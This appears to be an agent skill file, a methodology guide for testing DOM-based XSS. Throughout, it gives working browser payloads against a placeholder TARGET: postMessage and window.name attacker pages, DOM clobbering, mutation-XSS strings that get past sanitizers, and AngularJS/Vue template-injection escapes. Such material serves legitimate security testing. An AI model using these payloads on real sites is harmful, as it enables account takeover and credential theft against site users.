---
name: dom-xss
description: DOM-based XSS testing covering source/sink analysis, postMessage exploitation, DOM clobbering, and browser-based detection techniques
---

# DOM-Based XSS

DOM XSS occurs entirely in the browser — user-controlled input flows from a JavaScript source (URL fragment, document.referrer, postMessage) into a dangerous sink (innerHTML, eval, document.write) without server-side reflection. Standard curl-based testing cannot detect it.

## Attack Surface

- Single-page applications (React, Angular, Vue) with client-side routing
- Pages using URL fragments (#), query parameters processed by JavaScript
- Applications using postMessage for cross-origin communication
- Pages dynamically rendering user input via innerHTML, jQuery .html(), template literals

## Reconnaissance

### Source Detection

```javascript
// Common DOM XSS sources — where attacker-controlled data enters JS
location.hash          // #payload — not sent to server
location.search        // ?param=payload
location.href          // full URL
location.pathname      // /path/payload
document.referrer      // Referer header (attacker controls via linking page)
document.URL           // full URL string
document.documentURI   // similar to document.URL
window.name            // persists across navigations — attacker sets via window.open
document.cookie        // if attacker can set cookies (subdomain XSS)
postMessage data       // cross-origin messages from attacker window
localStorage/sessionStorage  // if attacker can write (via sub-domain XSS)
```

### Sink Detection

```javascript
// Dangerous sinks — where data gets interpreted as code/HTML
document.write()         // writes raw HTML
document.writeln()       // same as write with newline
element.innerHTML        // parses and renders HTML
element.outerHTML        // replaces element with parsed HTML
element.insertAdjacentHTML()  // inserts parsed HTML
eval()                   // executes JavaScript string
setTimeout(string)       // executes string as JS
setInterval(string)      // executes string as JS
Function(string)         // creates function from string
$.html()                 // jQuery — same as innerHTML
$.append()               // jQuery — parses and appends HTML
$.prepend()              // jQuery — parses and prepends HTML
$(user_input)            // jQuery selector injection — creates elements from HTML
element.src              // loads attacker URL (script, iframe, img)
element.href             // navigates to attacker URL (javascript: protocol)
window.location          // redirect to attacker URL
document.location        // redirect to attacker URL
```

## Key Vulnerabilities

### URL Fragment (Hash) Based

```bash
# Test if hash is read by JavaScript
# Open in browser:
https://TARGET/page#<img src=x onerror=alert(1)>
https://TARGET/page#"><script>alert(1)</script>
https://TARGET/page#javascript:alert(1)

# Check for hash-based routing frameworks
https://TARGET/#/admin
https://TARGET/#/../../secret

# Vue.js hash mode routing
https://TARGET/#/page?param=<img/src/onerror=alert(1)>
```

### document.referrer Based

```html
<!-- Host this on attacker page, link to target -->
<a href="https://TARGET/page" id="ref">Click</a>
<script>
  // Set referrer by navigating from a page with XSS payload in URL
  // Referrer: https://attacker.com/<img src=x onerror=alert(1)>
</script>
```

### window.name Based

```html
<!-- Attacker page: set window.name, then redirect to target -->
<script>
  window.name = '<img src=x onerror=alert(document.domain)>';
  location = 'https://TARGET/vulnerable-page';
</script>
<!-- If target reads window.name into innerHTML → XSS -->
```

### postMessage Based

```html
<!-- Attacker page: send malicious postMessage to target -->
<iframe src="https://TARGET/page" id="target"></iframe>
<script>
  document.getElementById('target').onload = function() {
    // Test if target accepts messages without origin check
    this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    this.contentWindow.postMessage('{"type":"update","html":"<img src=x onerror=alert(1)>"}', '*');
    this.contentWindow.postMessage('javascript:alert(1)', '*');
  };
</script>
```

### jQuery Selector Injection

```bash
# jQuery $(user_input) creates elements from HTML strings
# If URL hash or param is passed to $():
https://TARGET/page#<img/src/onerror=alert(1)>

# jQuery < 3.5 is vulnerable to:
https://TARGET/page?param=<img src=x onerror=alert(1)>
# If code does: $(location.search.split('=')[1])
```

### DOM Clobbering

```html
<!-- Clobber JavaScript variables via HTML elements with id/name -->
<!-- If target code does: if(window.config) { url = config.url; } -->
<a id="config" href="javascript:alert(1)">
<form id="config"><input name="url" value="javascript:alert(1)"></form>

<!-- Clobber with named elements -->
<img id="isAdmin" src="x">
<!-- Now window.isAdmin is truthy → bypass client-side auth checks -->
```

## Advanced Techniques

### Automated DOM Source/Sink Discovery

```javascript
// Paste in browser console to find sources flowing to sinks
// Override dangerous sinks to detect data flow
(function() {
  const origWrite = document.write;
  document.write = function(x) {
    console.trace('[DOM XSS SINK] document.write:', x.substring(0, 200));
    return origWrite.apply(this, arguments);
  };

  const origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
  Object.defineProperty(Element.prototype, 'innerHTML', {
    set: function(val) {
      if (val && typeof val === 'string' && (val.includes('<') || val.includes('javascript:'))) {
        console.trace('[DOM XSS SINK] innerHTML:', val.substring(0, 200));
      }
      return origInnerHTML.set.call(this, val);
    },
    get: origInnerHTML.get
  });

  const origEval = window.eval;
  window.eval = function(x) {
    console.trace('[DOM XSS SINK] eval:', String(x).substring(0, 200));
    return origEval.apply(this, arguments);
  };
})();
```

### Source Map Analysis

```bash
# Download and analyze source maps for client-side code
curl -sk "https://TARGET/static/main.js" | grep -oP '//# sourceMappingURL=\K.*'
curl -sk "https://TARGET/static/main.js.map" | python3 -m json.tool | grep -iE "innerHTML|eval|document.write|postMessage|location.hash"

# Unpack source maps
npx source-map-explorer https://TARGET/static/main.js.map
```

### Mutation XSS (mXSS)

```html
<!-- Bypass DOMPurify and sanitizers via browser HTML mutation -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><style><img src=x onerror=alert(1)></style></svg>
<math><mtext><img src=x onerror=alert(1)>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

### Client-Side Template Injection (CSTI)

```bash
# AngularJS (if ng-app present without CSP)
https://TARGET/page#{{constructor.constructor('alert(1)')()}}
https://TARGET/page?q={{$on.constructor('alert(1)')()}}

# Vue.js (if v-html or template compilation from user input)
https://TARGET/page?msg={{_c.constructor('alert(1)')()}}
```

## Testing Methodology

1. **Crawl JavaScript** — download all JS files, search for sinks (innerHTML, eval, document.write, $.html)
2. **Map sources** — identify where user input enters JS (location.hash, search, postMessage handlers)
3. **Trace data flow** — follow source → transformations → sink paths in code
4. **Test dynamically** — open target in browser, use console sink hooks to detect live data flows
5. **Inject via sources** — place payloads in hash, query params, window.name, postMessage
6. **Test sanitizer bypass** — if DOMPurify/sanitizer present, try mXSS and encoding bypasses
7. **Check postMessage** — verify origin validation, test with attacker-controlled iframe

## Validation

1. Alert/console.log fires in browser from attacker-controlled source (hash, postMessage, referrer)
2. Source code confirms source → sink data flow without sanitization
3. Payload persists across page navigation (stored DOM XSS via localStorage/sessionStorage)
4. postMessage handler accepts messages from any origin

## False Positives

- Input is sanitized by DOMPurify or framework-level escaping (React's JSX, Angular's template binding)
- CSP blocks inline script execution (script-src without 'unsafe-inline')
- Source is URL-decoded/encoded by browser before reaching sink
- Framework uses textContent instead of innerHTML

## Impact

- Account takeover via cookie/token theft
- Keylogging and credential harvesting
- Defacement and phishing
- Wormable XSS in social platforms (self-propagating payloads)

## Pro Tips

1. **curl CANNOT find DOM XSS** — you MUST test in a browser or analyze JavaScript source
2. Look for `location.hash` usage — hash fragments are never sent to server, so WAFs cannot inspect them
3. postMessage handlers without origin checks are extremely common and high-impact
4. jQuery's `$()` function creates HTML elements if the string starts with `<` — this is a major sink
5. Check for `.innerHTML =` assignments in React dangerouslySetInnerHTML, Vue v-html, Angular [innerHTML]
6. Source maps (`.js.map` files) reveal original source code — search for sinks in readable format
7. window.name persists across navigations — powerful source that survives redirects
8. DOM clobbering can bypass `if (window.someVar)` checks to inject values
9. Test AngularJS sandboxes — many versions have known sandbox escape payloads
10. mXSS (mutation XSS) bypasses server-side and client-side sanitizers — test with nested math/svg/style tags
